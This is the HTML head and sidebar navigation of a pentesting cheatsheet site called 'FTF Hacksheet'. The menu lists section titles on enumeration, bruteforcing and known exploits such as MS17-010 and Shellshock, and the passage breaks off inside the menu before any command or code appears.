<!DOCTYPE html> <html lang="en-US"> <head> <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=Edge"> <title>FTF Hacksheet</title> <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"> <link rel="stylesheet" href="/assets/css/just-the-docs-default.css"> <script type="text/javascript" src="/assets/js/vendor/lunr.min.js"></script> <script type="text/javascript" src="/assets/js/just-the-docs.js"></script> <meta name="viewport" content="width=device-width, initial-scale=1"> <!-- Begin Jekyll SEO tag v2.8.0 --> <title>ftf-hacksheet | FTF Hacksheet</title> <meta name="generator" content="Jekyll v4.2.2" /> <meta property="og:title" content="ftf-hacksheet" /> <meta property="og:locale" content="en_US" /> <meta name="description" content="Forget the Flag Hacksheet is a compilation oneliners and common usage of pentesting tools to allow the friendly hacker to focus on happy hacking!" /> <meta property="og:description" content="Forget the Flag Hacksheet is a compilation oneliners and common usage of pentesting tools to allow the friendly hacker to focus on happy hacking!" /> <link rel="canonical" href="http://localhost:4000/" /> <meta property="og:url" content="http://localhost:4000/" /> <meta property="og:site_name" content="FTF Hacksheet" /> <meta property="og:type" content="website" /> <meta name="twitter:card" content="summary" /> <meta property="twitter:title" content="ftf-hacksheet" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"WebSite","description":"Forget the Flag Hacksheet is a compilation oneliners and common usage of pentesting tools to allow the friendly hacker to focus on happy hacking!","headline":"ftf-hacksheet","name":"FTF Hacksheet","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/ftf-logo.png"}},"url":"http://localhost:4000/"}</script> <!-- End Jekyll SEO tag --> </head> <body> <svg xmlns="http://www.w3.org/2000/svg" style="display: none;"> <symbol id="svg-link" viewBox="0 0 24 24"> <title>Link</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-link"> <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path> </svg> </symbol> <symbol id="svg-search" viewBox="0 0 24 24"> <title>Search</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"> <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line> </svg> </symbol> <symbol id="svg-menu" viewBox="0 0 24 24"> <title>Menu</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"> <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line> </svg> </symbol> <symbol id="svg-arrow-right" viewBox="0 0 24 24"> <title>Expand</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right"> <polyline points="9 18 15 12 9 6"></polyline> </svg> </symbol> <symbol id="svg-doc" viewBox="0 0 24 24"> <title>Document</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file"> <path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline> </svg> </symbol> </svg> <div class="side-bar"> <div class="site-header"> <a title="Forget the Flag" href="https://github.com/caribpa/forget-the-flag-hacksheet " class="site-title lh-tight"> <div class="site-logo"></div> </a> <a href="#" id="menu-button" class="site-button"> <svg viewBox="0 0 24 24" class="icon"><use xlink:href="#svg-menu"></use></svg> </a> </div> <nav role="navigation" aria-label="Main" id="site-nav" class="site-nav"> <div class="nav-category"> <ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#cheatsheets" class="nav-list-link">Cheatsheets</a><ul class="nav-list"><li class="nav-list-item"><a href="#cheatsheets--cheat-sh" class="nav-list-link">Cheat.sh</a></li><li class="nav-list-item"><a href="#cheatsheets--tldr" class="nav-list-link">tldr</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#network-enumeration" class="nav-list-link">Network Enumeration</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#network-enumeration--ip" class="nav-list-link">IP</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#network-enumeration--ip--find-external-ip" class="nav-list-link">Find External IP</a><ul class="nav-list"><li class="nav-list-item"><a href="#network-enumeration--ip--find-external-ip--dig" class="nav-list-link">Dig</a></li><li class="nav-list-item"><a href="#network-enumeration--ip--find-external-ip--openssl-s_client" class="nav-list-link">openssl s_client</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#network-enumeration--ip--find-internal-ip" class="nav-list-link">Find Internal IP</a><ul class="nav-list"><li class="nav-list-item"><a href="#network-enumeration--ip--find-internal-ip--local-subnet" class="nav-list-link">Local Subnet</a></li><li class="nav-list-item"><a href="#network-enumeration--ip--find-internal-ip--get-the-eth0-gateway" class="nav-list-link">Get the eth0 Gateway</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#network-enumeration--dns-and-hostnames" class="nav-list-link">DNS and Hostnames</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#network-enumeration--dns-and-hostnames--domain-resolution" class="nav-list-link">Domain Resolution</a><ul class="nav-list"><li class="nav-list-item"><a href="#network-enumeration--dns-and-hostnames--domain-resolution--perl" class="nav-list-link">Perl</a></li></ul></li><li class="nav-list-item"><a href="#network-enumeration--dns-and-hostnames--sub-network-resolution" class="nav-list-link">Sub-Network Resolution</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#network-enumeration--dns-and-hostnames--zone-transfer" class="nav-list-link">Zone Transfer</a><ul class="nav-list"><li class="nav-list-item"><a href="#network-enumeration--dns-and-hostnames--zone-transfer--notes" class="nav-list-link">Notes</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#network-enumeration--dns-and-hostnames--zone-transfer--identify" class="nav-list-link">Identify</a><ul class="nav-list"><li class="nav-list-item"><a href="#network-enumeration--dns-and-hostnames--zone-transfer--identify--host" class="nav-list-link">Host</a></li><li class="nav-list-item"><a href="#network-enumeration--dns-and-hostnames--zone-transfer--identify--nslookup" class="nav-list-link">NSlookup</a></li><li class="nav-list-item"><a href="#network-enumeration--dns-and-hostnames--zone-transfer--identify--dig" class="nav-list-link">Dig</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#network-enumeration--dns-and-hostnames--bruteforce" class="nav-list-link">Bruteforce</a><ul class="nav-list"><li class="nav-list-item"><a href="#network-enumeration--dns-and-hostnames--bruteforce--dictionaries" class="nav-list-link">Dictionaries</a></li><li class="nav-list-item"><a href="#network-enumeration--dns-and-hostnames--bruteforce--ffuf" class="nav-list-link">Ffuf</a></li><li class="nav-list-item"><a href="#network-enumeration--dns-and-hostnames--bruteforce--gobuster" class="nav-list-link">Gobuster</a></li></ul></li><li class="nav-list-item"><a href="#network-enumeration--dns-and-hostnames--hosts" class="nav-list-link">Hosts</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#network-enumeration--dns-and-hostnames--change-dns" class="nav-list-link">Change DNS</a><ul class="nav-list"><li class="nav-list-item"><a href="#network-enumeration--dns-and-hostnames--change-dns--systemd-resolved" class="nav-list-link">Systemd-resolved</a></li><li class="nav-list-item"><a href="#network-enumeration--dns-and-hostnames--change-dns--resolv-conf" class="nav-list-link">Resolv.conf</a></li><li class="nav-list-item"><a href="#network-enumeration--dns-and-hostnames--change-dns--networkmanager" class="nav-list-link">NetworkManager</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#network-enumeration--ping" class="nav-list-link">Ping</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#network-enumeration--ports" class="nav-list-link">Ports</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#network-enumeration--ports--scan" class="nav-list-link">Scan</a><ul class="nav-list"><li class="nav-list-item"><a href="#network-enumeration--ports--scan--nmap" class="nav-list-link">Nmap</a></li><li class="nav-list-item"><a href="#network-enumeration--ports--scan--masscan" class="nav-list-link">Masscan</a></li><li class="nav-list-item"><a href="#network-enumeration--ports--scan--bash" class="nav-list-link">Bash</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#network-enumeration--ports--banners" class="nav-list-link">Banners</a><ul class="nav-list"><li class="nav-list-item"><a href="#network-enumeration--ports--banners--netcat" class="nav-list-link">Netcat</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#network-enumeration--traffic-capture" class="nav-list-link">Traffic Capture</a><ul class="nav-list"><li class="nav-list-item"><a href="#network-enumeration--traffic-capture--tcpdump" class="nav-list-link">tcpdump</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#network-enumeration--website---url" class="nav-list-link">Website / URL</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#network-enumeration--website---url--discovery" class="nav-list-link">Discovery</a><ul class="nav-list"><li class="nav-list-item"><a href="#network-enumeration--website---url--discovery--nmap" class="nav-list-link">Nmap</a></li><li class="nav-list-item"><a href="#network-enumeration--website---url--discovery--dirhunt" class="nav-list-link">Dirhunt</a></li><li class="nav-list-item"><a href="#network-enumeration--website---url--discovery--gospider" class="nav-list-link">gospider</a></li><li class="nav-list-item"><a href="#network-enumeration--website---url--discovery--photon" class="nav-list-link">Photon</a></li><li class="nav-list-item"><a href="#network-enumeration--website---url--discovery--maryam" class="nav-list-link">Maryam</a></li><li class="nav-list-item"><a href="#network-enumeration--website---url--discovery--evine" class="nav-list-link">Evine</a></li><li class="nav-list-item"><a href="#network-enumeration--website---url--discovery--wappalyzer" class="nav-list-link">Wappalyzer</a></li><li class="nav-list-item"><a href="#network-enumeration--website---url--discovery--arjun" class="nav-list-link">Arjun</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#network-enumeration--website---url--bruteforce" class="nav-list-link">Bruteforce</a><ul class="nav-list"><li class="nav-list-item"><a href="#network-enumeration--website---url--bruteforce--dictionaries" class="nav-list-link">Dictionaries</a></li><li class="nav-list-item"><a href="#network-enumeration--website---url--bruteforce--ffuf" class="nav-list-link">Ffuf</a></li><li class="nav-list-item"><a href="#network-enumeration--website---url--bruteforce--gobuster" class="nav-list-link">Gobuster</a></li><li class="nav-list-item"><a href="#network-enumeration--website---url--bruteforce--wfuzz" class="nav-list-link">Wfuzz</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#network-enumeration--website---url--tampering" class="nav-list-link">Tampering</a><ul class="nav-list"><li class="nav-list-item"><a href="#network-enumeration--website---url--tampering--wuzz" class="nav-list-link">Wuzz</a></li><li class="nav-list-item"><a href="#network-enumeration--website---url--tampering--mitmproxy" class="nav-list-link">Mitmproxy</a></li><li class="nav-list-item"><a href="#network-enumeration--website---url--tampering--requestify" class="nav-list-link">Requestify</a></li><li class="nav-list-item"><a href="#network-enumeration--website---url--tampering--rabid" class="nav-list-link">RABID</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#network-enumeration--website---url--ssrf" class="nav-list-link">SSRF</a><ul class="nav-list"><li class="nav-list-item"><a href="#network-enumeration--website---url--ssrf--curl" class="nav-list-link">curl</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#network-enumeration--website---url--uri-schemes" class="nav-list-link">URI Schemes</a><ul class="nav-list"><li class="nav-list-item"><a href="#network-enumeration--website---url--uri-schemes--http---https" class="nav-list-link">HTTP / HTTPS</a></li><li class="nav-list-item"><a href="#network-enumeration--website---url--uri-schemes--ftp---ftps" class="nav-list-link">FTP / FTPS</a></li><li class="nav-list-item"><a href="#network-enumeration--website---url--uri-schemes--file" class="nav-list-link">File</a></li><li class="nav-list-item"><a href="#network-enumeration--website---url--uri-schemes--data" class="nav-list-link">Data</a></li></ul></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols" class="nav-list-link">Protocols</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--smb" class="nav-list-link">SMB</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--smb--enumeration" class="nav-list-link">Enumeration</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--smb--enumeration--nmap" class="nav-list-link">Nmap</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--smb--enumeration--nmap--safe" class="nav-list-link">Safe</a></li><li class="nav-list-item"><a href="#protocols--smb--enumeration--nmap--unsafe" class="nav-list-link">Unsafe</a></li></ul></li><li class="nav-list-item"><a href="#protocols--smb--enumeration--enum4linux" class="nav-list-link">enum4linux</a></li><li class="nav-list-item"><a href="#protocols--smb--enumeration--smbclient" class="nav-list-link">smbclient</a></li><li class="nav-list-item"><a href="#protocols--smb--enumeration--smbmap" class="nav-list-link">smbmap</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--smb--bruteforce" class="nav-list-link">Bruteforce</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--smb--bruteforce--hydra" class="nav-list-link">Hydra</a></li><li class="nav-list-item"><a href="#protocols--smb--bruteforce--crackmapexec" class="nav-list-link">CrackMapExec</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--smb--mount-shares" class="nav-list-link">Mount shares</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--smb--mount-shares--mount" class="nav-list-link">mount</a></li></ul></li><li class="nav-list-item"><a href="#protocols--smb--ms-rpc---cve-2007-2447" class="nav-list-link">MS-RPC - CVE-2007-2447</a></li><li class="nav-list-item"><a href="#protocols--smb--ms08-067" class="nav-list-link">MS08-067</a></li><li class="nav-list-item"><a href="#protocols--smb--ms17-010" class="nav-list-link">MS17-010</a></li><li class="nav-list-item"><a href="#protocols--smb--printerbug-py" class="nav-list-link">printerbug.py</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--smb--impacket" class="nav-list-link">Impacket</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--smb--impacket--psexec" class="nav-list-link">PSEXEC</a></li><li class="nav-list-item"><a href="#protocols--smb--impacket--smbserver" class="nav-list-link">SMBserver</a></li><li class="nav-list-item"><a href="#protocols--smb--impacket--smbrelayx" class="nav-list-link">SMBrelayx</a></li></ul></li><li class="nav-list-item"><a href="#protocols--smb--winexe" class="nav-list-link">winexe</a></li><li class="nav-list-item"><a href="#protocols--smb--metasploit" class="nav-list-link">Metasploit</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--nfs" class="nav-list-link">NFS</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--nfs--enumeration" class="nav-list-link">Enumeration</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--nfs--enumeration--showmount" class="nav-list-link">showmount</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--nfs--mount-shares" class="nav-list-link">Mount shares</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--nfs--mount-shares--mount" class="nav-list-link">mount</a></li><li class="nav-list-item"><a href="#protocols--nfs--mount-shares--bypass-access-permission-restrictions" class="nav-list-link">Bypass Access Permission Restrictions</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--rpc" class="nav-list-link">RPC</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--rpc--enumeration" class="nav-list-link">Enumeration</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--rpc--enumeration--rpcinfo" class="nav-list-link">rpcinfo</a></li><li class="nav-list-item"><a href="#protocols--rpc--enumeration--rpcclient" class="nav-list-link">rpcclient</a></li><li class="nav-list-item"><a href="#protocols--rpc--enumeration--rpcdump" class="nav-list-link">rpcdump</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--ntlm" class="nav-list-link">NTLM</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--ntlm--capture" class="nav-list-link">Capture</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--ntlm--capture--responder" class="nav-list-link">Responder</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--ldap" class="nav-list-link">LDAP</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--ldap--enumeration" class="nav-list-link">Enumeration</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--ldap--enumeration--ldapsearch" class="nav-list-link">ldapsearch</a></li><li class="nav-list-item"><a href="#protocols--ldap--enumeration--ldapdomaindump" class="nav-list-link">ldapdomaindump</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--kerberos" class="nav-list-link">Kerberos</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--kerberos--enumeration---bruteforce" class="nav-list-link">Enumeration / Bruteforce</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--kerberos--enumeration---bruteforce--kerbrute" class="nav-list-link">kerbrute</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--kerberos--as-rep-roasting" class="nav-list-link">AS-REP Roasting</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--kerberos--as-rep-roasting--getnpusers" class="nav-list-link">GetNPUsers</a></li><li class="nav-list-item"><a href="#protocols--kerberos--as-rep-roasting--getadusers" class="nav-list-link">GetADUsers</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--winrm---psrp" class="nav-list-link">WinRM / PSRP</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--winrm---psrp--evil-winrm" class="nav-list-link">evil-winrm</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--http---https" class="nav-list-link">HTTP / HTTPS</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--http---https--enumeration" class="nav-list-link">Enumeration</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--http---https--enumeration--console-page-rendering" class="nav-list-link">Console page rendering</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--http---https--enumeration--console-page-rendering--w3m" class="nav-list-link">w3m</a></li><li class="nav-list-item"><a href="#protocols--http---https--enumeration--console-page-rendering--browsh" class="nav-list-link">Browsh</a></li><li class="nav-list-item"><a href="#protocols--http---https--enumeration--console-page-rendering--lynx" class="nav-list-link">Lynx</a></li><li class="nav-list-item"><a href="#protocols--http---https--enumeration--console-page-rendering--html2text" class="nav-list-link">html2text</a></li></ul></li><li class="nav-list-item"><a href="#protocols--http---https--enumeration--curl" class="nav-list-link">Curl</a></li><li class="nav-list-item"><a href="#protocols--http---https--enumeration--httpie" class="nav-list-link">HTTPie</a></li><li class="nav-list-item"><a href="#protocols--http---https--enumeration--openssl-s_client" class="nav-list-link">openssl s_client</a></li><li class="nav-list-item"><a href="#protocols--http---https--enumeration--bash" class="nav-list-link">Bash</a></li><li class="nav-list-item"><a href="#protocols--http---https--enumeration--perl" class="nav-list-link">Perl</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--http---https--methods" class="nav-list-link">Methods</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--http---https--methods--identification" class="nav-list-link">Identification</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--http---https--methods--put" class="nav-list-link">PUT</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--http---https--methods--put--notes" class="nav-list-link">Notes</a></li><li class="nav-list-item"><a href="#protocols--http---https--methods--put--check-all-subdirs" class="nav-list-link">Check All Subdirs</a></li><li class="nav-list-item"><a href="#protocols--http---https--methods--put--nmap" class="nav-list-link">Nmap</a></li><li class="nav-list-item"><a href="#protocols--http---https--methods--put--curl" class="nav-list-link">Curl</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--http---https--methods--get" class="nav-list-link">GET</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--http---https--methods--get--wget" class="nav-list-link">Wget</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--http---https--headers" class="nav-list-link">Headers</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--http---https--headers--keep-alive" class="nav-list-link">Keep-Alive</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--http---https--bruteforce" class="nav-list-link">Bruteforce</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--http---https--bruteforce--forms" class="nav-list-link">Forms</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--http---https--bruteforce--forms--dynamic-csrf---oauth-token-protection-bypass" class="nav-list-link">Dynamic CSRF / OAuth Token Protection Bypass</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--http---https--bruteforce--forms--dynamic-csrf---oauth-token-protection-bypass--tools" class="nav-list-link">Tools</a></li><li class="nav-list-item"><a href="#protocols--http---https--bruteforce--forms--dynamic-csrf---oauth-token-protection-bypass--proxies" class="nav-list-link">Proxies</a></li></ul></li><li class="nav-list-item"><a href="#protocols--http---https--bruteforce--forms--hydra" class="nav-list-link">Hydra</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--http---https--bruteforce--basic---digest---ntlm" class="nav-list-link">Basic / Digest / NTLM</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--http---https--bruteforce--basic---digest---ntlm--medusa" class="nav-list-link">Medusa</a></li><li class="nav-list-item"><a href="#protocols--http---https--bruteforce--basic---digest---ntlm--ffuf" class="nav-list-link">Ffuf</a></li><li class="nav-list-item"><a href="#protocols--http---https--bruteforce--basic---digest---ntlm--patator" class="nav-list-link">Patator</a></li></ul></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--rpc" class="nav-list-link">RPC</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--rpc--ms04-011" class="nav-list-link">MS04-011</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--ftp" class="nav-list-link">FTP</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--ftp--enumeration" class="nav-list-link">Enumeration</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--ftp--enumeration--netcat" class="nav-list-link">Netcat</a></li><li class="nav-list-item"><a href="#protocols--ftp--enumeration--ftp" class="nav-list-link">FTP</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--ftp--backdoors" class="nav-list-link">Backdoors</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--ftp--backdoors--vsftpd-2-3-4" class="nav-list-link">vsFTPd 2.3.4</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--ssh" class="nav-list-link">SSH</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--ssh--bruteforce" class="nav-list-link">Bruteforce</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--ssh--bruteforce--usernames" class="nav-list-link">Usernames</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--ssh--bruteforce--passwords" class="nav-list-link">Passwords</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--ssh--bruteforce--passwords--hydra" class="nav-list-link">Hydra</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#protocols--ssh--shellshock---cve-2014-6271" class="nav-list-link">Shellshock - CVE-2014-6271</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--ssh--cve-2015-6565" class="nav-list-link">CVE-2015-6565</a><ul class="nav-list"><li 